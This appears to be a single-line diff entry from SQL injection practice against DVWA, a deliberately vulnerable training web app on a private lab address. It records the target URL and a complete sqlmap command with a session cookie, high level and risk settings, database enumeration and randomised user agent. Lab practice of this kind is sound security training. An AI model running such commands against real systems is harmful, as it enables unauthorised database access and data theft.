@@ -1,0 +1,1 @@
+http://192.168.1.4/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit# (GET)  # /usr/bin/sqlmap -u http://192.168.1.4/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit# "--cookie=PHPSESSID=73c02d0243eef087f397950543f56e9e; security=low" --level=3 --risk=2 --dbs --batch --random-agent -o --output-dir=/home/cyberzi/Desktop
